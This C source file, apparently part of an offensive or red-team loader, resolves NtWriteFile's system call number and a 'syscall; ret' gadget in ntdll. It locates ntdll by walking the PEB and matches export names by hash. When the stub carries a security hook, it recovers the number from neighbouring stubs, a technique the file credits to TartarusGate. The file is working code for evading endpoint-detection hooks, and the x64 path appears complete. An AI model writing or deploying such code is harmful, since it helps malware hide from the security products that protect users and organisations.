#include "ntwritefile.h"
#include "types.h"
#include "utils.h"

#define NTWRITEFILE_HASH 0x8accec2d0bb46d81ULL
#define NTDLL_HASH 0x4fd1cd7bbe06fcfcULL
#define UP -32
#define DOWN 32

#ifdef _WIN64
    #define ReadTeb() ((PTEB)__readgsqword(0x30))
#else // x86
    #define ReadTeb() ((PTEB)__readfsdword(0x18))
#endif // _WIN64

static PVOID GetNtdllBase(void) {
    // more thorough, even if marginal improvement
    PTEB pTeb = ReadTeb();
    PPEB pPeb = pTeb->ProcessEnvironmentBlock;

    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    LIST_ENTRY* pHead = &pLdr->InMemoryOrderModuleList;

    for (LIST_ENTRY* pEntry = pHead->Flink; pEntry != pHead; pEntry = pEntry->Flink) {
        PLDR_DATA_TABLE_ENTRY pLdrEntry =
            CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (djb2w(pLdrEntry->BaseDllName.Buffer) == NTDLL_HASH) {
            return pLdrEntry->DllBase;
        }
    }

    return NULL;
}

static BYTE* FindStub(BYTE* pbBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pbBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pbBase + pDos->e_lfanew);

    DWORD dwExpRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)(pbBase + dwExpRva);

    PDWORD pdwNames = (PDWORD)(pbBase + pExp->AddressOfNames);
    PDWORD pdwFuncs = (PDWORD)(pbBase + pExp->AddressOfFunctions);
    PWORD pwOrds = (PWORD)(pbBase + pExp->AddressOfNameOrdinals);

    for (DWORD dwIdx = 0; dwIdx < pExp->NumberOfNames; dwIdx++) {
        if (djb2((PBYTE)(pbBase + pdwNames[dwIdx])) == NTWRITEFILE_HASH) {
            return pbBase + pdwFuncs[pwOrds[dwIdx]];
        }
    }

    return NULL;
}

static BYTE* ScanGadget(BYTE* pbBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pbBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pbBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    for (WORD wIdx = 0; wIdx < pNt->FileHeader.NumberOfSections; wIdx++, pSec++) {
        // ".text": skip dot, check bytes 1-4 ("text") little-endian
        if (*(DWORD*)(pSec->Name + 1) != 'txet') {
            continue;
        }

        BYTE* pbStart = pbBase + pSec->VirtualAddress;
        BYTE* pbEnd = pbStart + pSec->Misc.VirtualSize - 2;
        for (BYTE* pb = pbStart; pb < pbEnd; pb++) {
            if (pb[0] == 0x0F && pb[1] == 0x05 && pb[2] == 0xC3) {
                return pb;
            }
        }
    }

    return NULL;
}

static BOOL NeighborSSN(BYTE* pbStub, WORD wIdx, int iDir, DWORD* pdwSSN) {
    BYTE* pbNeighbor = pbStub + wIdx * iDir;
    if (pbNeighbor[0] != 0x4C || pbNeighbor[1] != 0x8B || pbNeighbor[2] != 0xD1
        || pbNeighbor[3] != 0xB8) {
        return FALSE;
    }

    DWORD dwSSN = (DWORD)(pbNeighbor[5] << 8) | pbNeighbor[4];
    *pdwSSN = iDir > 0 ? dwSSN - wIdx : dwSSN + wIdx;

    return TRUE;
}

BOOL ResolveNtWriteFile(DWORD* pdwSSN, PVOID* ppvGadget) {
    BYTE* pbBase = GetNtdllBase();
    if (!pbBase) {
        return FALSE;
    }

    BYTE* pbStub = FindStub(pbBase);
    if (!pbStub) {
        return FALSE;
    }

#ifdef _WIN64

    // unhooked x64 stub:
    // 4C 8B D1 B8 <SSN> (mov r10, rcx; mov eax, ssn)

    if (pbStub[0] == 0x4C && pbStub[1] == 0x8B && pbStub[2] == 0xD1 && pbStub[3] == 0xB8) {
        *pdwSSN = *(DWORD*)(pbStub + 4);
        *ppvGadget = ScanGadget(pbBase);
        return *ppvGadget != NULL;
    }

    // hooked: jmp at byte 0 or byte 3 (scan neighbors)
    // as seen in https://github.com/trickster0/TartarusGate

    if (pbStub[0] == 0xe9 || pbStub[3] == 0xe9) {
        for (WORD wIdx = 1; wIdx <= 500; wIdx++) {
            if (NeighborSSN(pbStub, wIdx, DOWN, pdwSSN) || NeighborSSN(pbStub, wIdx, UP, pdwSSN)) {
                *ppvGadget = ScanGadget(pbBase);
                return *ppvGadget != NULL;
            }
        }

        return FALSE;
    }

    return FALSE;

#else // x86

    // TODO: x86 stub patterns (int 2e = CD 2E C3, sysenter = 0F 34 C3)

    (void)pbStub;
    (void)pdwSSN;
    (void)ppvGadget;

    return FALSE;

#endif
}
